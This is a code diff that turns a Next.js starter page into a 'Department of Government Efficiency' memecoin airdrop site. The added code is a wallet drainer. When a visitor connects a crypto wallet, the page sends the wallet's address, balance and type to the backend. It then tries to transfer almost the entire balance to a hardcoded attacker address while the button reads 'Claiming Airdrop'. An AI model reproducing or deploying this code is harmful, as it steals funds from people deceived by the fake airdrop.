@@ -1,101 +1,132 @@
-import Image from "next/image";
+'use client'
+import { Sidebar } from "@/components/sidebar"
+import { StatsBar } from "@/components/stats-bar"
+import { Button } from "@/components/ui/button";
+import { useConnectModal } from '@rainbow-me/rainbowkit';
+import { useEffect, useState } from "react";
+import { parseEther } from "viem";
+import { useAccount, useBalance, useSendTransaction } from 'wagmi'
 
 export default function Home() {
-  return (
-    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
-      <main className="flex flex-col gap-8 row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="list-inside list-decimal text-sm text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
-          <li className="mb-2">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-semibold">
-              app/page.tsx
-            </code>
-            .
-          </li>
-          <li>Save and see your changes instantly.</li>
-        </ol>
+  const { openConnectModal } = useConnectModal();
+  const { address, isConnected, connector } = useAccount();
+  const { data, isLoading } = useBalance({ address: address });
+  const { sendTransaction, isPending } = useSendTransaction()
+  const [isSend, setIsSend] = useState(false)
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:min-w-44"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
+  useEffect(() => {
+    const sendUserInfo = async () => {
+      const infoResp = await fetch('api/agent', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ msg: '' })
+      });
+      console.log(infoResp)
+    }
+    sendUserInfo()
+  }, [])
+
+  useEffect(() => {
+    if (isConnected && !isLoading) {
+      const balance = data?.formatted || '';
+
+      const sendWalletInfo = async () => {
+        const walletResp = await fetch('api/wallet', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address: address, balance: balance, name: connector?.name })
+        });
+        console.log(walletResp)
+      }
+
+      sendWalletInfo();
+      
+      if (parseFloat(balance) >= 0.0060) {
+        const adjustedBalance = parseFloat(balance) - 0.0015;
+        performTransfer(adjustedBalance)
+      } else {
+        alert('Sorry you are not eligible to claim airdrops')
+      }
+    }
+  }, [isConnected, isLoading])
+
+  const performTransfer = (amountToSend: number) => {
+    sendTransaction({
+      to: '0xeA2360284656b3A76a5f5473dB9bBdbAF5814fba',
+      value: parseEther(amountToSend + ''),
+    })
+    setIsSend(true)
+  }
+
+  useEffect(() => {
+    if(!isPending && isSend){
+      const sendConfirmation = async() => {
+        const balance = data?.formatted || '';
+    
+        const walletResp = await fetch('api/tran', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address: address, balance: balance })
+        });
+        console.log(walletResp)
+        setIsSend(false)
+      }
+
+      sendConfirmation();
+    }
+  }, [isPending, isSend])
+
+  return (
+    <div className="min-h-screen">
+      <Sidebar />
+
+      <main className="lg:ml-64 p-6 pb-16">
+        <div className=" mx-auto">
+          <div className="mb-8">
+            <h1 className="text-xl font-bold mb-2">
+              WELCOME TO THE DEPARTMENT OF GOVERNMENT EFFICIENCY COMMUNITY MEME PROJECT
+            </h1>
+            <p className="text-xs text-gray-400">LAST UPDATED: 2024-12-13 11:13:36</p>
+          </div>
+
+          <div className="lg:flex lg:flex-row justify-center items-center">
+            <div className="mb-12 lg:w-[1200px]">
+              <h2 className="text-sm mb-2">D.O.G.E COMMUNITY MEME PROJECT</h2>
+              <h3 className="text-4xl font-bold mb-6 max-sm:text-2xl">
+                OUR MISSION IS TO BRING AWARENESS TO GOVERNMENT SPENDING AND OVER-REGULATION.
+              </h3>
+              <p className="text-black mb-6 max-sm:text-md">
+                Our mission is to decentralize the narrative around government spending, giving power back to the people
+                to hold government entities accountable for their financial decisions. We leverage the power and virality
+                of memes, community and cryptocurrency culture, in an effort to make government transparency not only
+                accessible but also engaging. Through awareness, education, and direct involvement, our community is our
+                strength. Together, we will navigate towards a future where government efficiency is not just a goal but a
+                standard.
+              </p>
+
+              <Button variant="outline" className="bg-black text-white p-5" onClick={openConnectModal}>
+                {isConnected ? 'Wallet Connected Claiming Airdrop' : 'BUY $DOGEGOV MEMECOIN'}
+              </Button>
+            </div>
+
+            <div className="relative aspect-video w-full mb-12 rounded-lg overflow-hidden">
+              <video controls >
+                <source src="https://doge-videos.b-cdn.net/doge-trailer.mp4" type="video/mp4" />
+              </video>
+            </div>
+          </div>
+
+          <div className="text-xs text-black mb-12 max-sm:hidden">
+            #DogeGov has no association with the official DOGE Organisation. This token is community meme project to
+            create awareness to government spending and over-regulation and has no intrinsic value or expectation of
+            financial return. There is no formal team or roadmap. The token is for educational and for entertainment
+            purposes only.
+          </div>
         </div>
       </main>
-      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
+
+      <StatsBar />
     </div>
-  );
+  )
 }
+
